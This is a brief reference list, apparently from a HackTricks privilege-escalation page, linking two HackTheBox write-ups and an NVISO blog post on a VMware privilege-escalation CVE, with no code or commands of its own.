- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
